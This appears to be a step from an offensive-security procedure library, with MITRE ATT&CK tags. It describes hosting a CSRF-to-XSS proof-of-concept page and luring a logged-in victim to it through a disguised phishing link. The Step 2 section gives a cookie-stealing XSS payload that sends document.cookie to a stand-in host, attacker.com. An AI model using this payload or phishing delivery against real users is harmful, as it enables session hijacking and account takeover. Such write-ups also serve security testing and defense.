---
id: proc-uuid-step5
tags:
  - attack-delivery
  - exploitation
type: procedure
tools: []
tactics:
  - '[[Collection]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:46:32.081Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
---
# Deliver and Execute CSRF XSS Attack

## Summary

This procedure involves delivering the malicious HTML PoC to an authenticated victim, triggering the CSRF submission and subsequent XSS execution for session theft or further compromise.

## Description

By hosting the PoC on an attacker-controlled site and luring the victim (who is logged into the target app), the page loads and auto-submits the form. This updates the victim's profile with the XSS payload, executing JavaScript in the app's context on *.██████████, potentially exfiltrating cookies or performing actions.

## Requirements

1. Crafted PoC HTML from previous step
2. Method to deliver to victim (e.g., email, link sharing)
3. Victim authenticated to target application

## Defense

Defensive measures and detection strategies:

- Deploy user training on suspicious links and social engineering
- Monitor for unexpected profile updates or JS errors in logs
- Use browser extensions to warn on auto-submitting forms

## Objectives

1. Achieve non-interactive exploitation via victim interaction
2. Execute arbitrary JS for data theft or actions
3. Demonstrate full impact of chained vulnerabilities

## Instructions

### Step 1: Host and Distribute PoC

**Context**: Make the PoC accessible and send to victim.

Host the HTML on a server (e.g., GitHub Pages, ngrok). Send a phishing link disguised as a legitimate resource.

### Step 2: Monitor Execution

**Context**: Observe the attack outcome on victim load.

When victim visits, the form submits via CSRF, injecting XSS. Replace alert with payload like: <svg/onload=fetch('http://attacker.com?cookie='+document.cookie)>

**Expected Output**: Alert fires or data exfiltrated to attacker server, confirming execution on target domain.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[Drive-by Compromise]] Drive-by Compromise
- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- attack-delivery
- exploitation
